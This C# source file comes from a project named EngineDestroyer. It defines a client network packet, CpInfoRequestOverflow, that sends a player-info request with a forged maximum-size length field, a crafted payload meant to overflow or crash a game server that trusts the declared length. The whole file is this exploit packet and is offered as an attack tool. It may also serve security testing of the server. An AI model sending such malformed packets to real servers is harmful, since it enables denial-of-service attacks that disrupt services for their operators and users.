namespace EngineDestroyer.Network.Packets {
    public class CpInfoRequestOverflow : ClientPacket {
        public CpInfoRequestOverflow() {
            msg.Write((int)ClientHeader.CPlayerInfoRequest);
            // Escreve o tamanho do texto.
            msg.Write(int.MaxValue);
            // Escreve os caracteres.
            msg.Write(long.MaxValue);
        }
    }
}